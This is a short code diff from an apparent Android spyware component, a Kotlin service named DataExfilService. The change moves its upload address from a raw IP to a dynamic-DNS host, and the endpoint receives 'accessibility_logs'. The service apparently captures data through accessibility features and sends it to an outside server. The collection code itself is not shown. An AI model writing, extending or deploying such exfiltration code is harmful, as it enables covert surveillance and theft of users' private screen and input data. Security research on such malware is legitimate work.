@@ -39,7 +39,7 @@ class DataExfilService : Service() {
 
     companion object {
         const val TAG = "DataExfilService"
-        private const val BASE_URL = "http://20.2.92.176:5000"
+        private const val BASE_URL = "https://zining.duckdns.org:5000"
         private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
         private const val NOTIFICATION_ID = 1001
         private const val SERVER_ENDPOINT = "$BASE_URL/accessibility_logs"
